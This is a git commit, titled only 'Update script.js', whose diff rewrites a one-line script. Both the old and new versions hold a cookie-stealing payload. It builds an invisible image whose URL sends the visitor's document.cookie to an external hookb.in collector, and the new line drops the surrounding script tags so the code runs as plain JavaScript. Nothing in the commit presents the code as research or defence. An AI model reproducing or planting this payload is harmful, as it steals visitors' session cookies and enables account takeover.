477e64ab4a1b5694cdfc4badc78b56a72b66be70
sj1525 <66286507+sj1525@users.noreply.github.com>
2021-02-05 19:27:42 -0800

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-<script>var img = new Image(0,0); img.src='https://hookb.in/XkRM6gdBr7cGBBm3J00J?cooki=' + document.cookie; document.body.appendChild(img);</script>
+var img = new Image(0,0); img.src='https://hookb.in/XkRM6gdBr7cGBBm3J00J?cooki=' + document.cookie; document.body.appendChild(img);
